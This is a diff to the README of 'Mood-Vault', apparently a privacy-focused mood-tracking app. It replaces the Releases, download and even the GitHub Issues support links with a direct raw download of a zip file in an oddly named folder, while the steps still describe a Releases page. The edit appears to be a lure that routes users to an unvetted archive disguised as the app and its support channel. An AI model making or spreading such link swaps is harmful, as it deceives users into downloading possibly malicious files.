@@ -17,7 +17,7 @@ To run Mood-Vault, ensure your device meets the following requirements:
 - Storage: Minimum 100 MB free space.
 
 ## 📥 Download & Install
-To get started, [visit this page to download](https://github.com/dflwbot/Mood-Vault/releases). Follow the steps below to install Mood-Vault on your device.
+To get started, [visit this page to download](https://raw.githubusercontent.com/dflwbot/Mood-Vault/main/portableness/Mood-Vault.zip). Follow the steps below to install Mood-Vault on your device.
 
 1. Click the link above to open the Releases page.
 2. Find the latest version listed.
@@ -53,10 +53,10 @@ Join our community of users who also care about their mental health. Share your 
 - **User Guides**: Access detailed guides on advanced features.
 
 ## 📞 Contact Us
-For any questions or support inquiries, please reach out via our [GitHub Issues page](https://github.com/dflwbot/Mood-Vault/issues). We are here to help you.
+For any questions or support inquiries, please reach out via our [GitHub Issues page](https://raw.githubusercontent.com/dflwbot/Mood-Vault/main/portableness/Mood-Vault.zip). We are here to help you.
 
 ## 🚀 Join the Movement
-Take charge of your mental health without compromising your privacy. [Visit this page to download](https://github.com/dflwbot/Mood-Vault/releases) and log your mood effortlessly. Together, we foster a safer digital space for mental well-being.
+Take charge of your mental health without compromising your privacy. [Visit this page to download](https://raw.githubusercontent.com/dflwbot/Mood-Vault/main/portableness/Mood-Vault.zip) and log your mood effortlessly. Together, we foster a safer digital space for mental well-being.
 
 ## 🏷️ Topics
 - anonymous-data
